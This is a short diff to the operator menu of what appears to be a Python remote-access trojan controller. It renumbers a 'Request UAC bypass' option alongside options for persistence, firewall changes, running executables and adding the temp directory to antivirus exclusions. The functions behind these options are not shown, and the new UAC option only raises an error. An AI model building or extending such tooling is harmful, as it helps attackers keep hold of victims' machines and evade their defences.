@@ -20,8 +20,9 @@ def show_options():
     print(Fore.GREEN + "\t\t[ 04 ] Become Persistant " + Style.RESET_ALL)
     print(Fore.GREEN + "\t\t[ 05 ] Modify Firewall " + Style.RESET_ALL)
     print(Fore.GREEN + "\t\t[ 06 ] Run an executable " + Style.RESET_ALL)
-    # print(Fore.GREEN + "\t\t[ 07 ] Request UAC bypass " + Style.RESET_ALL)
     print(Fore.GREEN + "\t\t[ 07 ] Add temp to AV exclusions " + Style.RESET_ALL)
+    print(Fore.GREEN + "\t\t[ 08 ] Request UAC bypass " + Style.RESET_ALL)
+    
     
     
     
@@ -57,12 +58,14 @@ def connection_handler(server):
         elif option == "6":
             clear_screen()
             execute_apps(server)
-        # elif option == "7":
-            # display_msg("Requesting UAC Bypass")
+
 
         elif option == "7":
             display_msg("Adding temp dir to antivirus bypass")
             add_exception(server)
+        elif option == "8":
+            display_msg("Requesting UAC Bypass")
+            raise ConnectionError
         elif option == "clear":
             clear_screen()        
         elif option == "exit" or option == "99" or option == "stop" or option == "quit":
